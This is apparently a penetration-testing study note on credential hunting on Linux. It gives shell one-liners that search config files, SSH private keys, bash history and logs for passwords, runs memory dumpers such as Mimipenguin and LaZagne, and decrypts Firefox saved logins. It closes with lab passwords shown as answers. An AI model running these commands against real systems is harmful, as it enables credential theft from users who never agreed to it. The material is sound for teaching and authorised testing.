# Credentail Hunting

## **Files**

### **Credentials in Configuration Files**

```bash
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

### **Databases**

```bash
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

### **Notes**

```shell-session
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

> Notes is chalenging to find due to the name of the file could be anything and might not have an extension. We can scan for all of those file and look at the file names manually

### **Scripts**

```shell-session
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

### **Cronjobs**

```shell-session
cat /etc/crontab
```

```shell-session
ls -la /etc/cron.*/
```

### **SSH Keys**

#### **SSH Private Keys**

```bash
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```

#### **SSH Public Keys**

```bash
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```

### **Bash History**

```shell-session
tail -n5 /home/*/.bash*
```

### **Logs**

```shell-session
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

## **Memory**

### **Mimipenguin**

```shell-session
sudo python3 mimipenguin.py
#or
sudo bash mimipenguin.sh 
```

### laZagne

To run the python package of laZagne.py you have to move the entire directory of the linux package from the github since it has all the dependencies.

```shell-session
sudo python3 laZagne.py all
```

### **Firefox Stored Credentials**

```shell-session
ls -l .mozilla/firefox/ | grep default 
```

```shell-session
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```

#### **Decrypting Firefox Credentials**

```shell-session
python3 firefox_decrypt.py
```

## Assessment

<figure><img src="../../../.gitbook/assets/image (48).png" alt=""><figcaption><p>kira:L0vey0u1!</p></figcaption></figure>

Running lazagne.py will give us the following

<figure><img src="../../../.gitbook/assets/image (35).png" alt=""><figcaption><p>TUqr7QfLTLhruhVbCP</p></figcaption></figure>

